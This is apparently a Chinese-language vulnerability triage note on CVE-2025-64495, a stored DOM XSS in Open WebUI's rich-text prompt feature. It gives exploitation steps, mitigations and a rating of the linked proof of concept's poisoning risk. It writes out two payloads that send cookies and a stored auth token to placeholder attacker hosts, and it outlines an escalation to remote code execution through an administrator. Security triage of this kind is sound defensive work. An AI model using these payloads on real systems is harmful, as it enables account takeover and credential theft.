## CVE-2025-64495-Open WebUI-Stored DOM XSS

**漏洞编号:** CVE-2025-64495

**漏洞类型:** Stored DOM XSS

**影响应用:** Open WebUI

**危害等级:** 高危，可能导致账户接管和远程代码执行

**影响版本:** <= 0.6.34

**利用条件:** 需要'Insert Prompt as Rich Text'功能启用，以及用户具有创建prompt的权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Open WebUI的prompt功能中，当'Insert Prompt as Rich Text'功能启用时，prompt内容未经充分 sanitization 就被插入到DOM中，导致Stored DOM XSS。攻击者可以利用此漏洞在prompt中插入恶意JavaScript代码，当其他用户使用该prompt时，恶意代码将在他们的浏览器中执行，从而可能导致cookie窃取、JWT token获取甚至RCE。漏洞利用流程如下：

1.  攻击者创建一个包含恶意JavaScript代码的prompt，例如窃取cookie或获取JWT token的代码。
2.  攻击者将prompt保存到Open WebUI系统中。
3.  其他用户在聊天窗口中使用`/`命令插入该prompt。
4.  恶意JavaScript代码在受害者用户的浏览器中执行。

利用代码示例：

*   Cookie Stealer: `<img src=x onerror="fetch('https://evil.ma/log?c='+document.cookie)">`
*   JWT Grabber: `<script>new Image().src='https://attacker.com/?token='+localStorage.getItem('auth_token');</script>`
*   RCE: 通过强制管理员运行函数创建API请求，并使用手动构造的字符串绕过引号过滤执行任意命令。

**投毒风险分析：**

该漏洞利用代码存在一定的投毒风险。虽然主要的payload看起来是为了演示漏洞或进行简单的信息窃取，但是RCE部分存在一定的隐患。

1.  RCE Payload 过于复杂：攻击者可以将更隐蔽的恶意代码隐藏在字符串构造的步骤中，使其难以被发现。
2.  利用管理员权限创建恶意函数： 攻击者可以使用精心构造的JavaScript代码来创建后门函数，例如允许攻击者在将来执行任意代码，或定期发送敏感数据到攻击者的服务器。 

综上所述，尽管漏洞本身是明确的XSS，但提供的RCE利用方式为潜在的投毒行为提供了渠道。因此，存在10%的投毒风险。

**有效性分析：**

根据漏洞库信息和提供的POC代码，可以判断该漏洞利用是有效的。POC代码演示了如何通过插入恶意HTML/JavaScript代码到prompt中，并在用户加载prompt时触发XSS。给出的补丁详情表明了该漏洞已被修复，通过DOMPurify进行 sanitization，并强制执行CSP策略，以及记录prompt创建等手段来防御。

**利用方式总结：**

1.  确保'Insert Prompt as Rich Text'功能启用。
2.  创建一个包含恶意JavaScript代码的prompt。
3.  诱导其他用户使用该prompt。

成功利用该漏洞可能导致账户接管和远程代码执行。

**缓解措施：**

*   升级到版本0.6.35或更高版本。
*   禁用'Insert Prompt as Rich Text'功能。
*   实施严格的输入验证和输出编码。

**项目地址:** [B1ack4sh/Blackash-CVE-2025-64495](https://github.com/B1ack4sh/Blackash-CVE-2025-64495)

**漏洞详情:** [CVE-2025-64495](https://nvd.nist.gov/vuln/detail/CVE-2025-64495)